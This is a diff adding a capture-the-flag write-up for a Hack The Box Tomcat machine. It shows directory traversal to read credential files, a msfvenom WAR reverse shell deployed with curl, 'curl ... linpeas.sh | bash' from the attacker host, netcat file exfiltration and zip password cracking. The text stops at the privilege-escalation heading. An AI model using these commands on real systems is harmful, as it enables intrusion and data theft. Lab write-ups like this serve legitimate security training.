@@ -13,8 +13,41 @@ PORT     STATE SERVICE VERSION
 |_http-title: Apache Tomcat
 
 Visiting the site 10.10.10.194/megahosting.htb, this has moved to a new site.
-Run an nmap full port scan
-PORT     STATE SERVICE
-22/tcp   open  ssh
-80/tcp   open  http
-8080/tcp open  http-proxy
+
+Testing directory traversal, http://megahosting.htb/news.php?file=../../../../etc/passwd
+We can see the list of users and we need a way of getting shell as a low privileged user
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin OR tomcat:x:997:997::/opt/tomcat:/bin/false OR ash:x:1000:1000:clive:/home/ash:/bin/bash
+We are not able to read the private key from root or ash home directory.
+We proceed to port 8080 to explore some more. The following lines are interesting "Tomcat veterans might be pleased to learn that this system instance of Tomcat is installed with CATALINA_HOME in /usr/share/tomcat9 and CATALINA_BASE in /var/lib/tomcat9"
+We also try to read users from "Users are defined in /etc/tomcat9/tomcat-users.xml." but no success. We search around where to find the tomcat config file on
+Apache httpd 2.4.41 and here at "view-source:http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml", we are able to read the
+default creds
+
+ <role rolename="admin-gui"/>
+   <role rolename="manager-script"/>
+   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
+   
+   We login to the web UI "http://10.10.10.194:8080/manager/html" using tomcat:$3cureP4s5w0rd123! and proceed to upload a war reverse shell payload.
+   
+  The syntax as "msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f war > shell.war" and then upload it through curl as :
+  "curl -u "tomcat:\$3cureP4s5w0rd123!" --upload-file shell.war http://10.10.10.194:8080/manager/text/deploy?path=/shell"
+  We then start a reverse netcat listener on port 4444 and call the page we uploaded the page as "curl http://10.10.10.194:8080/shell/"
+  Shell opened as tomcat user. We proceed to get a more stable shell by "python3 -c 'import pty; pty.spawn("/bin/bash")'"
+  We run the python simple server on attacking machine python3 -m http.server and run the linpeas shell on victim machine as "curl http://10.10.14.13:8000/linpeas.sh | bash"
+  Here, we discover some backup file on /var/www/html/files/ it is dated and appears as below 16162020_backup.zip.
+  Now, we use netcat to download file to our machine: 
+  1. On sending machine  "nc -w 3 10.10.14.13 1234 < 16162020_backup.zip"
+  2. On receiving machine  "nc -l -p 1234  > 16162020_backup.zip"
+  
+  To unzip the file we need a password. We send this zip to John and crack it as below:
+  1. zip2john 16162020_backup.zip > hash
+  2. john hash --wordlist=/usr/share/wordlists/rockyou.txt
+  Cracked password : admin@it
+  
+  Trying to su in as ash user with the password is successful. 
+  User flag pawned at /home/ash user directory!
+  
+  ================================
+  Privilege escalation
+  
+  
